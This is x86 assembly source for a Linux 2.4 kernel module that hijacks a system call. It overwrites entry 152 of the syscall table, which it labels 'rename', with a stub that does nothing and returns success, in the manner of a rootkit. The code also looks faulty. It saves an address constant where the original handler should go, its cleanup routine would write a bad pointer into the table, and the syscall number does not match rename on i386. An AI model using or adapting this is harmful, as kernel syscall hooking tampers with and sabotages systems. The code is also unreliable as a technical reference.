# as rename_hijack.s -o rename_hijack.o
# insmod rename_hijack.o

# 152 - rename 

.text

init_module:
	movl $sys_call_table+152,original_rename
	movl $hacked_syscall,sys_call_table+152
        movl $0,%eax /* return 0; */
        ret
cleanup_module:
        movl $original_rename,sys_call_table+152
	xorl %eax,%eax
	ret			
hacked_syscall:
	xorl %eax,%eax
	ret

.section .modinfo
.string "kernel_version=2.4.18-3"

.data
.comm original_rename,4,2


